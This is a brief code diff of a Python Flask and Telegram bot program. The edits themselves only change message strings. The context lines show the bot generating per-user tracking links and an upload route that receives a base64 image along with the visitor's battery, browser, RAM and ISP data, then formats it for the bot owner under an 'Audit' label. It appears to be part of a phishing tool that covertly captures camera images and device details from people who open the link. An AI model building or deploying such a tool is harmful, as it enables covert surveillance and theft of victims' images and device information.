@@ -95,7 +95,7 @@ def handle_query(call):
     if call.data.startswith("m_"):
         mode = call.data.split("_")[1]
         final_url = f"{RENDER_LINK}/?m={mode}&uid={call.message.chat.id}"
-        msg = f"🤠 <b>Your Link:</b>\n\n<a href='{final_url}'>{final_url}</a>\n\n✨ Team HCO ✨"
+        msg = f"🤠 <b>Your Link:</b>\n\n<a href='{final_url}'>{final_url}</a>\n\n✨ Thankyou Team HCO ✨"
         bot.send_message(call.message.chat.id, msg, parse_mode='HTML', disable_web_page_preview=True)
 
 @app.route('/')
@@ -109,7 +109,7 @@ def upload():
     except: isp = "Unknown"
     
     img_data = base64.b64decode(data.get('image').split(',')[1])
-    caption = (f"🛡️ <b>Audit:</b> {data.get('mode', 'N/A').upper()}\n"
+    caption = (f"🛡️ <b>Audit:</b> {data.get('label', 'N/A')}\n"
                f"🔋 <b>Battery:</b> {info.get('battery')}\n"
                f"🌐 <b>Browser:</b> {info.get('browser')}\n"
                f"🧠 <b>RAM:</b> {info.get('ram')}\n"
@@ -129,4 +129,4 @@ def upload():
 if __name__ == "__main__":
     threading.Thread(target=lambda: bot.polling(none_stop=True), daemon=True).start()
     app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
-        
+    
